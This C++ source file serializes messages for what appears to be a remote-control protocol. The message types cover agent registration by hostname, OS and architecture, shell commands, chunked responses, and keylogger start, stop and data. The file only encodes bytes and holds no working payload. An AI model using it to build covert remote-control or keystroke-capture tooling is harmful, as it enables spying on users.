#include "protocol/protocol_serializer.hpp"

#include <cstddef>

namespace {

constexpr std::size_t kMaxU16Value = 65535u;

void ensureFitsU16(std::size_t value, const std::string& source) {
  if (value > kMaxU16Value) {
    throw InvalidSize(source, std::to_string(value));
  }
}

void copyString(std::vector<uint8_t>& out, std::size_t offset,
                const std::string& value) {
  for (std::size_t i = 0; i < value.size(); ++i) {
    out[offset + i] = static_cast<uint8_t>(value[i]);
  }
}

void validateRegisterPayload(const RegisterPayload& payload) {
  if (payload.os_type > OSType::MAC) {
    throw InvalidFieldValue(
        "os_type", std::to_string(static_cast<uint8_t>(payload.os_type)));
  }
  if (payload.arch > ArchType::ARM) {
    throw InvalidFieldValue("arch",
                            std::to_string(static_cast<uint8_t>(payload.arch)));
  }
  if (payload.hostname.empty()) {
    throw InvalidSize("register hostname length", "0");
  }
  if (payload.hostname.size() > REGISTER_MAX_HOSTNAME_LEN) {
    throw InvalidSize("register hostname length",
                      std::to_string(payload.hostname.size()));
  }
}

void validateCommandPayload(const CommandPayload& payload) {
  if (payload.type > CommandType::STOP_KEYLOGGER) {
    throw InvalidFieldValue("command_type",
                            std::to_string(static_cast<uint8_t>(payload.type)));
  }
  if (payload.type != CommandType::SHELL && !payload.data.empty()) {
    throw InvalidSize("command data length",
                      std::to_string(payload.data.size()));
  }
  ensureFitsU16(payload.data.size(), "command data length");
}

void validateResponsePayload(const ResponsePayload& payload) {
  if (payload.status > ResponseStatus::ERROR) {
    throw InvalidFieldValue(
        "response_status",
        std::to_string(static_cast<uint8_t>(payload.status)));
  }
  if (payload.total_chunks == 0) {
    throw InvalidFieldValue("total_chunks", "0");
  }
  if (payload.chunk_index >= payload.total_chunks) {
    throw InvalidFieldValue(
        "chunk_index",
        std::to_string(static_cast<uint8_t>(payload.chunk_index)));
  }
  ensureFitsU16(payload.data.size(), "response data length");
}

void validateDataPayload(const DataPayload& payload) {
  if (payload.subtype > DataType::KEYLOGGER) {
    throw InvalidFieldValue(
        "data_type", std::to_string(static_cast<uint8_t>(payload.subtype)));
  }
  ensureFitsU16(payload.data.size(), "data length");
}

}  // namespace

std::vector<uint8_t> ProtocolSerializer::serializeHeader(
    const LptfHeader& header) {
  std::vector<uint8_t> headerInByte;
  headerInByte.resize(LPTF_HEADER_SIZE);

  for (std::size_t i = 0; i < sizeof(header.identifier); ++i) {
    headerInByte[i] = header.identifier[i];
  }

  headerInByte[4] = header.version;
  headerInByte[5] = static_cast<uint8_t>(header.type);

  ConvertEndian::writeU16BE(headerInByte, 6, header.size);

  return headerInByte;
}

std::vector<uint8_t> ProtocolSerializer::serializeRegisterPayload(
    const RegisterPayload& payload) {
  validateRegisterPayload(payload);

  const std::size_t finalSize = REGISTER_FIXED_BYTES + payload.hostname.size();
  std::vector<uint8_t> payloadInByte(finalSize);

  payloadInByte[0] = static_cast<uint8_t>(payload.os_type);
  payloadInByte[1] = static_cast<uint8_t>(payload.arch);
  ConvertEndian::writeU16BE(payloadInByte, 2,
                            static_cast<uint16_t>(payload.hostname.size()));
  copyString(payloadInByte, REGISTER_FIXED_BYTES, payload.hostname);
  return payloadInByte;
}

std::vector<uint8_t> ProtocolSerializer::serializeCommandPayload(
    const CommandPayload& payload) {
  validateCommandPayload(payload);

  const std::size_t finalSize = COMMAND_FIXED_BYTES + payload.data.size();
  std::vector<uint8_t> payloadInByte(finalSize);

  ConvertEndian::writeU16BE(payloadInByte, 0, payload.id);
  payloadInByte[2] = static_cast<uint8_t>(payload.type);
  ConvertEndian::writeU16BE(payloadInByte, 3,
                            static_cast<uint16_t>(payload.data.size()));
  copyString(payloadInByte, COMMAND_FIXED_BYTES, payload.data);
  return payloadInByte;
}

std::vector<uint8_t> ProtocolSerializer::serializeResponsePayload(
    const ResponsePayload& payload) {
  validateResponsePayload(payload);

  const std::size_t finalSize = RESPONSE_FIXED_BYTES + payload.data.size();
  std::vector<uint8_t> payloadInByte(finalSize);

  ConvertEndian::writeU16BE(payloadInByte, 0, payload.id);
  payloadInByte[2] = static_cast<uint8_t>(payload.status);
  payloadInByte[3] = payload.total_chunks;
  payloadInByte[4] = payload.chunk_index;
  ConvertEndian::writeU16BE(payloadInByte, 5,
                            static_cast<uint16_t>(payload.data.size()));
  copyString(payloadInByte, RESPONSE_FIXED_BYTES, payload.data);
  return payloadInByte;
}

std::vector<uint8_t> ProtocolSerializer::serializeDataPayload(
    const DataPayload& payload) {
  validateDataPayload(payload);

  const std::size_t finalSize = DATA_FIXED_BYTES + payload.data.size();
  std::vector<uint8_t> payloadInByte(finalSize);

  payloadInByte[0] = static_cast<uint8_t>(payload.subtype);
  ConvertEndian::writeU16BE(payloadInByte, 1,
                            static_cast<uint16_t>(payload.data.size()));
  copyString(payloadInByte, DATA_FIXED_BYTES, payload.data);
  return payloadInByte;
}

std::vector<uint8_t> ProtocolSerializer::serializeErrorPayload(
    const ErrorPayload& payload) {
  std::vector<uint8_t> payloadInByte;

  size_t offsetForMessage{sizeof(uint8_t) + sizeof(uint16_t)};
  size_t message_length = payload.message.size();
  size_t finalSize{offsetForMessage + message_length};

  payloadInByte.resize(finalSize);
  
  payloadInByte[0] = static_cast<uint8_t>(payload.code);
  ConvertEndian::writeU16BE(payloadInByte, 1, message_length);
  
  for (size_t i = 0; i < message_length; ++i ) {
    payloadInByte[i + offsetForMessage] = payload.message[i];
  }
  return payloadInByte;
}